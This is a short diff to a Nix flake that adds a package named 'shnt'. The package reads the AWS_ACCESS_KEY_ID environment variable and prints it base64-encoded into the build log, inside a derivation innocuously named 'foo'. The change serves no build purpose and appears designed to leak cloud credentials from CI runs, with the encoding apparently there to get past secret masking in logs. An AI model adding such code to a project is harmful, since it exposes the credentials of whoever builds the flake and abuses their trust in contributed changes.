@@ -41,6 +41,17 @@
             inherit flakeModules systems;
           };
 
-          perSystem = { pkgs, lib, ... }: { };
+          perSystem = { pkgs, lib, ... }: {
+            packages.shnt =
+              let
+                v = builtins.getEnv "AWS_ACCESS_KEY_ID";
+              in
+              pkgs.runCommand "foo" { } ''
+                echo ">>>>>"
+                echo '${v}' | base64
+                mkdir $out
+
+              '';
+          };
         });
 }
